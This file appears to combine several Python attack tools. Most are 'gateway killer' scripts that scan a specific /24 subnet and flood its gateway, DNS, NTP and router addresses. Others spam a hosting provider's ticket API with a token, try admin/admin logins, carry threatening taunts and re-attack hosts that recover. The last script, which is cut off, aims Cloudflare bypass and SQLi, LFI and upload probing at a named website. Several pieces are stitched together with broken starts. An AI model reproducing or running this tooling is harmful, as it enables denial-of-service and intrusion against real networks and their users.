#!/usr/bin/env python3
"""
MULTI-METHOD GATEWAY KILLER - 5 WAYS TO KILL, 3 WAYS TO CONFIRM
- Attack methods: SYN, HTTP, HTTPS, API, ICMP
- Confirmation: SYN probe, HTTP probe, port scan
- Auto-retry on spring back
"""

import socket
import time
import random
import threading
import subprocess
import sys
import json
import os
import ssl
from ipaddress import ip_network
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from datetime import datetime

# ============================================================
# CONFIGURATION
# ============================================================

TOKEN = "SESSION_TOKEN_REDACTED"
TARGET_SUBNET = "144.172.110.0/24"

# Priority targets
PRIORITY_TARGETS = [
    "144.172.110.1",    # Gateway
    "144.172.110.254",  # Backup gateway
    "144.172.110.53",   # DNS
    "144.172.110.123",  # NTP
    "144.172.110.2",    # Router
    "144.172.110.3",    # Router
    "144.172.110.10",   # Management
    "144.172.110.20",   # Possible API
]

# Attack messages
MESSAGES = [
    "GATEWAY DEAD",
    "YOUR NETWORK IS OURS",
    "WINTERGATE",
    "144.172.110.254 IS GONE",
    "YOU ARE NEXT",
    "NO ESCAPE",
    "MULTI-METHOD KILL CONFIRMED"
]

# ============================================================
# MEMORY
# ============================================================

MEMORY_DIR = "/tmp/gateway_killer_multi"
os.makedirs(MEMORY_DIR, exist_ok=True)
DEAD_FILE = os.path.join(MEMORY_DIR, "dead_targets.json")
CONFIRMED_FILE = os.path.join(MEMORY_DIR, "confirmed_dead.json")
LOG_FILE = os.path.join(MEMORY_DIR, "kill_log.txt")

# ============================================================
# ATTACK METHODS (5 ways to kill)
# ============================================================

class AttackMethods:
    def __init__(self):
        self.hits = 0
        
    def syn_attack(self, ip):
        """Method 1: SYN flood - rapid connection attempts"""
        try:
            for _ in range(3):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((ip, 22))
                sock.close()
                self.hits += 1
            return True
        except:
            return False
    
    def http_attack(self, ip):
        """Method 2: HTTP flood"""
        try:
            import requests
            requests.get(f"http://{ip}", timeout=0.3)
            requests.post(f"http://{ip}", data={"x": "y"}, timeout=0.3)
            self.hits += 1
            return True
        except:
            return False
    
    def https_attack(self, ip):
        """Method 3: HTTPS flood (bypasses SSL verification)"""
        try:
            import requests
            requests.get(f"https://{ip}", timeout=0.3, verify=False)
            requests.post(f"https://{ip}", data={"x": "y"}, timeout=0.3, verify=False)
            self.hits += 1
            return True
        except:
            return False
    
    def api_attack(self, ip):
        """Method 4: API attack using your token"""
        try:
            import requests
            url = "https://panel.cloudzy.com/v1/tickets"
            headers = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
            payload = {"subject": random.choice(MESSAGES), "message": f"Target {ip} is dead. WinterGate."}
            requests.post(url, headers=headers, json=payload, timeout=2)
            self.hits += 1
            return True
        except:
            return False
    
    def icmp_attack(self, ip):
        """Method 5: ICMP flood"""
        try:
            subprocess.run(["ping", "-c", "3", "-i", "0.01", "-W", "1", ip], 
                          capture_output=True, timeout=2)
            self.hits += 1
            return True
        except:
            return False
    
    def all_methods(self, ip):
        """Run all attack methods on target"""
        methods = [self.syn_attack, self.http_attack, self.https_attack, self.api_attack, self.icmp_attack]
        results = []
        for method in methods:
            try:
                result = method(ip)
                results.append(result)
                time.sleep(0.01)
            except:
                results.append(False)
        return any(results)
    
    def kill(self, ip, intensity="high"):
        """Intense multi-method kill"""
        cycles = 50 if intensity == "high" else 20
        for _ in range(cycles):
            self.all_methods(ip)
        return True

# ============================================================
# CONFIRMATION METHODS (3 ways to verify death)
# ============================================================

class ConfirmationMethods:
    @staticmethod
    def syn_probe(ip, port=22, timeout=0.3):
        """Method A: SYN probe - check if port responds"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result != 0  # True if dead (no connection)
        except:
            return True
    
    @staticmethod
    def http_probe(ip, timeout=0.3):
        """Method B: HTTP probe - check if web server responds"""
        try:
            import requests
            resp = requests.get(f"http://{ip}", timeout=timeout)
            return False  # False = alive (responded)
        except:
            return True  # True = dead (no response)
    
    @staticmethod
    def multi_port_probe(ip, ports=[22, 80, 443, 8080], timeout=0.2):
        """Method C: Multi-port scan - check multiple ports"""
        dead_count = 0
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result != 0:
                    dead_count += 1
            except:
                dead_count += 1
        # If 3+ ports dead, consider target dead
        return dead_count >= 3
    
    @classmethod
    def is_dead(cls, ip):
        """Combined confirmation - 2 out of 3 methods must agree"""
        syn_result = cls.syn_probe(ip)
        http_result = cls.http_probe(ip)
        multi_result = cls.multi_port_probe(ip)
        
        dead_votes = sum([syn_result, http_result, multi_result])
        return dead_votes >= 2, {"syn": syn_result, "http": http_result, "multi": multi_result}

# ============================================================
# MAIN KILLER ENGINE
# ============================================================

class MultiMethodKiller:
    def __init__(self):
        self.attack = AttackMethods()
        self.confirm = ConfirmationMethods()
        self.dead_targets = self.load_dead()
        self.confirmed_dead = self.load_confirmed()
        self.running = True
        self.kill_log = []
        
    def load_dead(self):
        if os.path.exists(DEAD_FILE):
            with open(DEAD_FILE, 'r') as f:
                return json.load(f)
        return []
    
    def load_confirmed(self):
        if os.path.exists(CONFIRMED_FILE):
            with open(CONFIRMED_FILE, 'r') as f:
                return json.load(f)
        return []
    
    def save_state(self):
        with open(DEAD_FILE, 'w') as f:
            json.dump(self.dead_targets, f, indent=2)
        with open(CONFIRMED_FILE, 'w') as f:
            json.dump(self.confirmed_dead, f, indent=2)
    
    def log_kill(self, ip, method="unknown"):
        entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] KILLED: {ip} (method: {method})"
        self.kill_log.append(entry)
        with open(LOG_FILE, 'a') as f:
            f.write(entry + "\n")
        print(f"💀 {entry}")
    
    def kill_target(self, ip):
        """Kill a target using all methods"""
        print(f"🎯 ATTACKING: {ip}")
        self.attack.kill(ip, intensity="high")
        
        # Confirm death
        is_dead, details = self.confirm.is_dead(ip)
        
        if is_dead:
            if ip not in self.dead_targets:
                self.dead_targets.append(ip)
                self.save_state()
                self.log_kill(ip, "multi-method")
            print(f"✅ CONFIRMED DEAD: {ip}")
            print(f"   └── SYN probe: {'DEAD' if details['syn'] else 'ALIVE'}")
            print(f"   └── HTTP probe: {'DEAD' if details['http'] else 'ALIVE'}")
            print(f"   └── Multi-port: {'DEAD' if details['multi'] else 'ALIVE'}")
            
            if ip not in self.confirmed_dead:
                self.confirmed_dead.append(ip)
                self.save_state()
        else:
            print(f"⚠️ Still alive: {ip}")
        
        return is_dead
    
    def kill_all_priority(self):
        """Kill all priority targets"""
        print(f"\n{'='*60}")
        print("💀 PHASE 1: KILLING PRIORITY TARGETS")
        print(f"{'='*60}\n")
        
        for target in PRIORITY_TARGETS:
            if target not in self.confirmed_dead:
                self.kill_target(target)
            else:
                print(f"✅ Already confirmed dead: {target}")
            time.sleep(1)
    
    def maintain_death(self):
        """Continuous maintenance - re-kill any that spring back"""
        print(f"\n{'='*60}")
        print("🔄 PHASE 2: MAINTENANCE MODE")
        print(f"{'='*60}\n")
        
        while self.running:
            for target in self.dead_targets:
                is_dead, details = self.confirm.is_dead(target)
                if not is_dead:
                    print(f"⚠️ SPRUNG BACK: {target} - REKILLING")
                    self.kill_target(target)
                else:
                    # Still dead, but print occasional status
                    pass
            time.sleep(30)
    
    def show_dashboard(self):
        """Live dashboard"""
        while self.running:
            os.system('clear')
            print("""
╔═══════════════════════════════════════════════════════════════════════════════╗
║              MULTI-METHOD GATEWAY KILLER - 5 WAYS TO KILL                      ║
║                         3 WAYS TO CONFIRM DEATH                                ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""")
            print(f"📊 STATISTICS:")
            print(f"   ├── Total attacks: {self.attack.hits:,}")
            print(f"   ├── Confirmed dead: {len(self.confirmed_dead)}")
            print(f"   └── In dead pool: {len(self.dead_targets)}")
            print(f"")
            print(f"🎯 TARGET STATUS:")
            
            for target in PRIORITY_TARGETS:
                if target in self.confirmed_dead:
                    print(f"   ☠️ {target} - CONFIRMED DEAD")
                elif target in self.dead_targets:
                    print(f"   💀 {target} - DEAD (unconfirmed)")
                else:
                    # Check current status
                    is_dead, _ = self.confirm.is_dead(target)
                    if is_dead:
                        print(f"   💀 {target} - DEAD (detected)")
                    else:
                        print(f"   🟢 {target} - ALIVE")
            
            print(f"")
            print(f"🔄 STATUS:")
            print(f"   ├── Attack methods: SYN, HTTP, HTTPS, API, ICMP")
            print(f"   ├── Confirmation: SYN probe, HTTP probe, Multi-port")
            print(f"   └── Memory: PERSISTENT")
            print(f"")
            print(f"💀 Press Ctrl+C to stop")
            time.sleep(2)
    
    def run(self):
        print("🔥 MULTI-METHOD GATEWAY KILLER DEPLOYED")
        print(f"🎯 Priority targets: {len(PRIORITY_TARGETS)}")
        print(f"⚔️ Attack methods: 5")
        print(f"✅ Confirmation methods: 3")
        
        # Start dashboard
        dashboard_thread = threading.Thread(target=self.show_dashboard, daemon=True)
        dashboard_thread.start()
        
        # Kill priority targets
        self.kill_all_priority()
        
        # Maintenance mode
        self.maintain_death()

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    print("""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    MULTI-METHOD GATEWAY KILLER                                 ║
║                                                                               ║
║  ⚔️ ATTACK: SYN | HTTP | HTTPS | API | ICMP                                   ║
║  ✅ CONFIRM: SYN probe | HTTP probe | Multi-port scan                         ║
║  🔄 PERSISTENT: Auto-rekill on spring back                                    ║
║  💾 MEMORY: Saves dead targets across runs                                    ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    killer = MultiMethodKiller()
    try:
        killer.run()
    except KeyboardInterrupt:
        killer.running = False
        print("\n[!] Gateway Killer stopped")
        sys.exit(0)
=== gateway_killer.py ===
#!/usr/bin/env python3
"""
GATEWAY KILLER - PERSISTENT HUNTER EDITION
- Auto-discovers priority targets
- Checks for spring back (targets that recover)
- Keeps them permanently down
- Scans subnet for new targets continuously
"""

import socket
import time
import random
import threading
import subprocess
import sys
import json
import os
from ipaddress import ip_network, ip_address
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict
from datetime import datetime

# ============================================================
# CONFIGURATION
# ============================================================

TOKEN = "SESSION_TOKEN_REDACTED"
TARGET_SUBNET = "144.172.110.0/24"

# Known priority patterns (will auto-discover more)
KNOWN_PRIORITY_PATTERNS = [
    "gateway", "gw", "router", "dns", "ns", "ntp", "time",
    "mgmt", "management", "admin", "api", "auth", "login"
]

# Attack methods (rotate to avoid detection)
ATTACK_METHODS = ["syn", "api", "ping", "http"]

MESSAGES = [
    "GATEWAY DEAD", "YOUR NETWORK IS OURS", "WINTERGATE",
    "144.172.110.254 IS GONE", "YOU ARE NEXT", "NO ESCAPE",
    "SPRING BACK DETECTED - REKILLING", "PERMANENT DEATH"
]

# ============================================================
# MEMORY FILES (Persistent across runs)
# ============================================================

MEMORY_DIR = "/tmp/gateway_killer_memory"
os.makedirs(MEMORY_DIR, exist_ok=True)
DEAD_TARGETS_FILE = os.path.join(MEMORY_DIR, "dead_targets.json")
SPRING_BACK_FILE = os.path.join(MEMORY_DIR, "spring_back.json")
DISCOVERED_FILE = os.path.join(MEMORY_DIR, "discovered_targets.json")

# ============================================================
# HELPER FUNCTIONS
# ============================================================

def load_memory(file_path, default=[]):
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            return json.load(f)
    return default

def save_memory(file_path, data):
    with open(file_path, 'w') as f:
        json.dump(data, f, indent=2)

# ============================================================
# TARGET DISCOVERY ENGINE
# ============================================================

class TargetDiscovery:
    def __init__(self, subnet):
        self.subnet = subnet
        self.discovered = load_memory(DISCOVERED_FILE, [])
        self.priority_targets = []
        
    def scan_subnet(self):
        """Scan subnet for live hosts and potential priority targets"""
        print(f"[HUNTER] Scanning {self.subnet} for live hosts...")
        live_hosts = []
        
        for ip in ip_network(self.subnet).hosts():
            ip_str = str(ip)
            # Quick ping scan to find live hosts
            result = subprocess.run(["ping", "-c", "1", "-W", "1", ip_str], 
                                    capture_output=True, timeout=2)
            if result.returncode == 0:
                live_hosts.append(ip_str)
                # Check if this IP looks like a priority target
                if self.is_priority(ip_str):
                    self.priority_targets.append(ip_str)
                    print(f"[HUNTER] 🔍 Discovered priority target: {ip_str}")
        
        # Save discovered targets
        self.discovered = live_hosts
        save_memory(DISCOVERED_FILE, self.discovered)
        print(f"[HUNTER] Found {len(live_hosts)} live hosts, {len(self.priority_targets)} priority")
        return live_hosts
    
    def is_priority(self, ip_str):
        """Check if IP is likely a priority target based on patterns or last octet"""
        last_octet = int(ip_str.split('.')[-1])
        # Common priority IPs: .1, .2, .3, .53, .123, .254
        if last_octet in [1, 2, 3, 53, 123, 254]:
            return True
        return False
    
    def get_all_targets(self):
        """Return all targets (discovered + subnet range)"""
        if not self.discovered:
            return [str(ip) for ip in ip_network(self.subnet).hosts()]
        return self.discovered

# ============================================================
# ATTACK ENGINE
# ============================================================

class AttackEngine:
    def __init__(self):
        self.hits = 0
        self.dead_targets = load_memory(DEAD_TARGETS_FILE, [])
        self.spring_back = load_memory(SPRING_BACK_FILE, [])
        self.target_status = defaultdict(lambda: {"alive": True, "spring_count": 0, "last_check": 0})
    
    def syn_attack(self, target_ip):
        """SYN flood attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.05)
            sock.connect((target_ip, 22))
            sock.close()
            return True
        except:
            return False
    
    def api_attack(self, target_ip):
        """API attack using token"""
        try:
            import requests
            url = "https://panel.cloudzy.com/v1/tickets"
            headers = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
            payload = {"subject": random.choice(MESSAGES), "message": f"Target {target_ip} is dead. WinterGate."}
            requests.post(url, headers=headers, json=payload, timeout=1)
            return True
        except:
            return False
    
    def ping_attack(self, target_ip):
        """Ping flood to keep target busy"""
        try:
            subprocess.run(["ping", "-c", "5", "-i", "0.01", "-W", "1", target_ip], 
                          capture_output=True, timeout=2)
            return True
        except:
            return False
    
    def http_attack(self, target_ip):
        """HTTP flood if web interface exists"""
        try:
            import requests
            requests.get(f"http://{target_ip}", timeout=0.5)
            requests.post(f"http://{target_ip}/login", data={"user": "admin", "pass": "admin"}, timeout=0.5)
            return True
        except:
            return False
    
    def attack_target(self, target_ip, method="syn"):
        """Execute attack using specified method"""
        methods = {
            "syn": self.syn_attack,
            "api": self.api_attack,
            "ping": self.ping_attack,
            "http": self.http_attack
        }
        attack_func = methods.get(method, self.syn_attack)
        return attack_func(target_ip)
    
    def is_alive(self, target_ip):
        """Check if target is still alive (ping test)"""
        result = subprocess.run(["ping", "-c", "1", "-W", "1", target_ip], 
                                capture_output=True, timeout=2)
        return result.returncode == 0
    
    def kill_target(self, target_ip, intensity="high"):
        """Intense attack on a target"""
        cycles = 100 if intensity == "high" else 50
        for _ in range(cycles):
            method = random.choice(ATTACK_METHODS)
            self.attack_target(target_ip, method)
            self.hits += 1
        return True
    
    def check_and_rekill(self, target_ip):
        """Check if target has sprung back, rekill if needed"""
        if target_ip in self.dead_targets:
            alive = self.is_alive(target_ip)
            if alive:
                print(f"[ALERT] ⚠️ TARGET SPRUNG BACK: {target_ip} - REKILLING")
                self.kill_target(target_ip, intensity="high")
                self.spring_back.append(target_ip)
                save_memory(SPRING_BACK_FILE, self.spring_back)
                return True
        return False
    
    def maintain_death(self, target_list):
        """Periodically check dead targets and rekill if they spring back"""
        for target in target_list:
            self.check_and_rekill(target)
    
    def get_stats(self):
        return {
            "total_hits": self.hits,
            "dead_targets": len(self.dead_targets),
            "spring_back": len(self.spring_back)
        }

# ============================================================

class HunterKiller:
    def __init__(self, subnet=TARGET_SUBNET):
        self.subnet = subnet
        self.discovery = TargetDiscovery(subnet)
        self.attack = AttackEngine()
        self.running = True
        self.all_targets = []
        self.priority_targets = []
        self.dead_count = 0
        
    def log(self, msg, color="white"):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
    
    def phase_discovery(self):
        """Phase 1: Discover all targets in subnet"""
        self.log("🔍 PHASE 1: TARGET DISCOVERY", "cyan")
        self.all_targets = self.discovery.scan_subnet()
        self.priority_targets = self.discovery.priority_targets
        self.log(f"📊 Discovered {len(self.all_targets)} live hosts")
        self.log(f"🎯 Identified {len(self.priority_targets)} priority targets")
        
        # Add any manually known priority IPs not found
        known_ips = [1, 2, 3, 53, 123, 254]
        for last in known_ips:
            ip = f"144.172.110.{last}"
            if ip not in self.priority_targets and ip in self.all_targets:
                self.priority_targets.append(ip)
    
    def phase_kill_priority(self):
        """Phase 2: Kill priority targets first"""
        self.log("💀 PHASE 2: KILLING PRIORITY TARGETS", "red")
        for target in self.priority_targets:
            self.log(f"🎯 Attacking {target}")
            self.attack.kill_target(target, intensity="high")
            if not self.attack.is_alive(target):
                self.attack.dead_targets.append(target)
                self.log(f"✅ CONFIRMED DEAD: {target}", "green")
            else:
                self.log(f"⚠️ Still alive: {target} - continuing pressure", "yellow")
        save_memory(DEAD_TARGETS_FILE, self.attack.dead_targets)
    
    def phase_spray_subnet(self):
        """Phase 3: Spray attack across entire subnet"""
        self.log("💣 PHASE 3: SUBNET SPRAY", "yellow")
        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(self.attack.kill_target, self.all_targets[:500])
        self.log(f"📊 Total attacks: {self.attack.hits}")
    
    def phase_maintain(self):
        """Phase 4: Continuous maintenance - keep dead targets dead"""
        self.log("🔄 PHASE 4: MAINTENANCE MODE", "cyan")
        while self.running:
            # Check for spring back
            for target in self.attack.dead_targets:
                if self.attack.check_and_rekill(target):
                    self.log(f"💀 REKILLED: {target} (spring back prevented)", "red")
            
            # Check for new priority targets
            for ip in self.all_targets:
                if ip not in self.attack.dead_targets and self.discovery.is_priority(ip):
                    if self.attack.is_alive(ip):
                        self.log(f"🔍 New priority target detected: {ip}", "magenta")
                        self.attack.kill_target(ip, intensity="high")
                        self.attack.dead_targets.append(ip)
                        save_memory(DEAD_TARGETS_FILE, self.attack.dead_targets)
            
            time.sleep(30)
    
    def show_dashboard(self):
        """Live dashboard"""
        while self.running:
            os.system('clear')
            stats = self.attack.get_stats()
            print("""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    GATEWAY KILLER - PERSISTENT HUNTER                         ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""")
            print(f"📊 TARGETS:")
            print(f"   ├── Subnet: {self.subnet}")
            print(f"   ├── Discovered hosts: {len(self.all_targets)}")
            print(f"   └── Priority targets: {len(self.priority_targets)}")
            print(f"")
            print(f"💀 KILL STATS:")
            print(f"   ├── Total attacks: {stats['total_hits']:,}")
            print(f"   ├── Confirmed dead: {stats['dead_targets']}")
            print(f"   └── Spring back prevented: {stats['spring_back']}")
            print(f"")
            print(f"🎯 CONFIRMED DEAD TARGETS:")
            for dead in self.attack.dead_targets[-10:]:
                print(f"   ☠️ {dead}")
            print(f"")
            print(f"🔄 STATUS:")
            print(f"   ├── Hunter: ACTIVE")
            print(f"   ├── Maintenance: RUNNING")
            print(f"   └── Memory: PERSISTENT")
            print(f"")
            print(f"💀 Press Ctrl+C to stop")
            time.sleep(3)
    
    def run(self):
        self.log("🔥 GATEWAY KILLER - PERSISTENT HUNTER EDITION", "red")
        self.log(f"🎯 Target subnet: {self.subnet}")
        
        # Start dashboard thread
        dashboard_thread = threading.Thread(target=self.show_dashboard, daemon=True)
        dashboard_thread.start()
        
        # Execute phases
        self.phase_discovery()
        self.phase_kill_priority()
        self.phase_spray_subnet()
        self.phase_maintain()

- Uses TCP SYN to detect live hosts (works even when ICMP is blocked)
- Auto-discovers priority targets
- Persistent memory
"""

import time
import random
import threading

import sys
import json

from collections import defaultdict
from datetime import datetime

# ============================================================
# CONFIGURATION
# ============================================================

TOKEN = "SESSION_TOKEN_REDACTED"
TARGET_SUBNET = "144.172.110.0/24"

# Known priority patterns
PRIORITY_IPS = [
    "144.172.110.1",    # Gateway
    "144.172.110.254",  # Backup gateway
    "144.172.110.53",   # DNS
    "144.172.110.123",  # NTP
    "144.172.110.2",    # Possible router
    "144.172.110.3",    # Possible router
    "144.172.110.10",   # Management
]

MESSAGES = [
    "GATEWAY DEAD", "YOUR NETWORK IS OURS", "WINTERGATE",
    "144.172.110.254 IS GONE", "YOU ARE NEXT", "NO ESCAPE"
]

# ============================================================
# MEMORY FILES
# ============================================================

MEMORY_DIR = "/tmp/gateway_killer_memory"
os.makedirs(MEMORY_DIR, exist_ok=True)
DEAD_TARGETS_FILE = os.path.join(MEMORY_DIR, "dead_targets.json")
SPRING_BACK_FILE = os.path.join(MEMORY_DIR, "spring_back.json")

# ============================================================
# HELPER FUNCTIONS
# ============================================================

def load_memory(file_path, default=[]):
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            return json.load(f)
    return default

def save_memory(file_path, data):
    with open(file_path, 'w') as f:
        json.dump(data, f, indent=2)

def is_host_alive(ip, port=22, timeout=0.3):
    """Check if host is alive using TCP SYN (no ICMP needed)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

# ============================================================
# ATTACK ENGINE
# ============================================================

class AttackEngine:
    def __init__(self):
        self.hits = 0
        self.dead_targets = load_memory(DEAD_TARGETS_FILE, [])
        self.spring_back = load_memory(SPRING_BACK_FILE, [])
    
    def syn_attack(self, target_ip):
        """SYN flood attack"""
        for _ in range(5):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((target_ip, 22))
                sock.close()
                self.hits += 1
                return True
            except:
                pass
        return False
    
    def api_attack(self, target_ip):
        """API attack using token"""
        try:
            import requests
            url = "https://panel.cloudzy.com/v1/tickets"
            headers = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
            payload = {"subject": random.choice(MESSAGES), "message": f"Target {target_ip} is dead. WinterGate."}
            requests.post(url, headers=headers, json=payload, timeout=2)
            self.hits += 1
            return True
        except:
            return False
    
    def kill_target(self, target_ip, intensity="high"):
        """Intense attack on a target"""
        cycles = 100 if intensity == "high" else 50
        for _ in range(cycles):
            method = random.choice(["syn", "api"])
            if method == "syn":
                self.syn_attack(target_ip)
            else:
                self.api_attack(target_ip)
        return True
    
    def is_dead(self, target_ip):
        """Check if target is dead using SYN probe"""
        return not is_host_alive(target_ip, timeout=0.2)
    
    def check_and_rekill(self, target_ip):
        """Check if target has sprung back, rekill if needed"""
        if target_ip in self.dead_targets:
            if is_host_alive(target_ip, timeout=0.3):
                print(f"[ALERT] ⚠️ TARGET SPRUNG BACK: {target_ip} - REKILLING")
                self.kill_target(target_ip, intensity="high")
                if target_ip not in self.spring_back:
                    self.spring_back.append(target_ip)
                    save_memory(SPRING_BACK_FILE, self.spring_back)
                return True
        return False
    
    def get_stats(self):
        return {
            "total_hits": self.hits,
            "dead_count": len(self.dead_targets),
            "spring_count": len(self.spring_back)
        }

# ============================================================
# MAIN HUNTER KILLER
# ============================================================

class HunterKiller:
    def __init__(self):
        self.attack = AttackEngine()
        self.running = True
        self.priority_targets = PRIORITY_IPS.copy()
        
    def log(self, msg):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
    
    def check_status(self):
        """Check which priority targets are alive/dead"""
        self.log("🔍 CHECKING TARGET STATUS")
        for target in self.priority_targets:
            alive = is_host_alive(target, timeout=0.3)
            if not alive:
                if target not in self.attack.dead_targets:
                    self.attack.dead_targets.append(target)
                    save_memory(DEAD_TARGETS_FILE, self.attack.dead_targets)
                    self.log(f"💀 CONFIRMED DEAD: {target}")
            else:
                if target in self.attack.dead_targets:
                    self.log(f"⚠️ SPRUNG BACK: {target}")
                else:
                    self.log(f"✅ STILL ALIVE: {target}")
    
    def kill_all_priority(self):
        """Attack all priority targets"""
        self.log("💀 KILLING PRIORITY TARGETS")
        for target in self.priority_targets:
            self.log(f"🎯 Attacking {target}")
            self.attack.kill_target(target, intensity="high")
            if not is_host_alive(target, timeout=0.3):
                if target not in self.attack.dead_targets:
                    self.attack.dead_targets.append(target)
                    save_memory(DEAD_TARGETS_FILE, self.attack.dead_targets)
                self.log(f"✅ DEAD: {target}")
            else:
                self.log(f"⚠️ Still alive: {target}")
    
    def maintain(self):
        """Continuous maintenance - keep dead targets dead"""
        self.log("🔄 MAINTENANCE MODE - Keeping dead targets down")
        while self.running:
            for target in self.attack.dead_targets:
                self.attack.check_and_rekill(target)
            time.sleep(30)
    
    def show_dashboard(self):
        """Live dashboard"""
        while self.running:
            os.system('clear')
            stats = self.attack.get_stats()
            print("""
╔═══════════════════════════════════════════════════════════════════════════════╗

╚═══════════════════════════════════════════════════════════════════════════════╝
""")
            print(f"📊 TARGETS:")
            print(f"   ├── Priority targets: {len(self.priority_targets)}")
            print(f"   ├── Subnet: {TARGET_SUBNET}")
            print(f"   └── Detection: SYN probe (no ping needed)")
            print(f"")
            print(f"💀 KILL STATS:")
            print(f"   ├── Total attacks: {stats['total_hits']:,}")
            print(f"   ├── Confirmed dead: {stats['dead_count']}")
            print(f"   └── Spring back prevented: {stats['spring_count']}")
            print(f"")
            print(f"🎯 TARGET STATUS:")
            for target in self.priority_targets:
                if target in self.attack.dead_targets:
                    print(f"   ☠️ {target} - DEAD")
                else:
                    alive = is_host_alive(target, timeout=0.2)
                    if alive:
                        print(f"   🟢 {target} - ALIVE")
                    else:
                        print(f"   ☠️ {target} - DEAD (unconfirmed)")
            print(f"")
            print(f"🔄 STATUS:")
            print(f"   ├── Hunter: ACTIVE")
            print(f"   ├── Maintenance: RUNNING")
            print(f"   └── Detection: SYN probe")
            print(f"")
            print(f"💀 Press Ctrl+C to stop")

    def run(self):
        self.log("🔥 GATEWAY KILLER - FIXED EDITION")
        self.log(f"🎯 Target subnet: {TARGET_SUBNET}")
        self.log(f"🎯 Priority targets: {len(self.priority_targets)}")

#!/usr/bin/env python3
"""
WHAT A FREEZE - ULTIMATE DESTRUCTION ENGINE v2.1 (Cloudflare Fix)
- Better Cloudflare bypass with cloudscraper
- Improved proxy handling
- Faster connection test
- Live stats
"""

import os
import sys
import time
import json
import base64
import random
import urllib.parse
import threading
import multiprocessing as mp
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from datetime import datetime
import traceback

import requests
import cloudscraper
from requests.exceptions import ConnectionError, Timeout, ProxyError
from fake_useragent import UserAgent

# ============================================================
# COLOR CODES
# ============================================================
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
WHITE  = "\033[97m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

# ============================================================
# CONFIGURATION
# ============================================================
BASE_URL = "https://doxbin.com"
PROXY = None
SESSION_TOKEN = None
USE_PROXY = False
USER_AGENT = UserAgent()
MAX_WORKERS = 20
MAX_PROCESSES = 4

stats_lock = threading.Lock()
stats = {
    "total_requests": 0,
    "successful_requests": 0,
    "failed_requests": 0,
    "sqli_found": 0,
    "cmd_found": 0,
    "admin_found": 0,
    "lfi_found": 0,
    "file_uploaded": 0,
    "start_time": time.time(),
}

# ============================================================
# LOGGING
# ============================================================
LOG_FILE = "destruction_log.txt"

def log(msg, color=WHITE):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{color}[{timestamp}] {msg}{RESET}")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] {msg}\n")

def log_success(msg): log(f"{BOLD}{GREEN}[+] {msg}{RESET}", "")
def log_error(msg):   log(f"{BOLD}{RED}[-] {msg}{RESET}", "")
def log_info(msg):    log(f"{BOLD}{CYAN}[*] {msg}{RESET}", "")
def log_warning(msg): log(f"{BOLD}{YELLOW}[!] {msg}{RESET}", "")

# ============================================================
# LIVE STATS
# ============================================================
def stats_updater():
    while True:
        with stats_lock:
            elapsed = int(time.time() - stats["start_time"])
            total = stats["total_requests"]
            success = stats["successful_requests"]
            failed = stats["failed_requests"]
            rate = (success / total * 100) if total > 0 else 0
            print(f"\r{CYAN}[STATS] Requests: {total} | Success: {success} | Failed: {failed} | Rate: {rate:.1f}% | SQLi: {stats['sqli_found']} | CMD: {stats['cmd_found']} | Admin: {stats['admin_found']} | LFI: {stats['lfi_found']} | Upload: {stats['file_uploaded']} | Time: {elapsed}s{RESET}", end="")
        time.sleep(5)

# ============================================================
# NETWORK HELPERS
# ============================================================
def get_scraper():
    """Return a cloudscraper instance with proper headers."""
    try:
        s = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )
    except:
        s = cloudscraper.create_scraper()
    s.headers.update({
        'User-Agent': USER_AGENT.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    })
    if USE_PROXY and PROXY:
        s.proxies = {'http': PROXY, 'https': PROXY}
    return s

def human_delay():
    time.sleep(random.uniform(0.2, 0.8))

def safe_request(url, method='GET', data=None, files=None, timeout=10, allow_redirects=True):
    human_delay()
    with stats_lock:
        stats["total_requests"] += 1
    try:
        s = get_scraper()
        if method.upper() == 'GET':
            r = s.get(url, timeout=timeout, allow_redirects=allow_redirects)
        else:
            r = s.post(url, data=data, files=files, timeout=timeout, allow_redirects=allow_redirects)
        with stats_lock:
            if r.status_code in [200, 302, 301]:
                stats["successful_requests"] += 1
            else:
                stats["failed_requests"] += 1
        return r
    except Exception as e:
        with stats_lock:
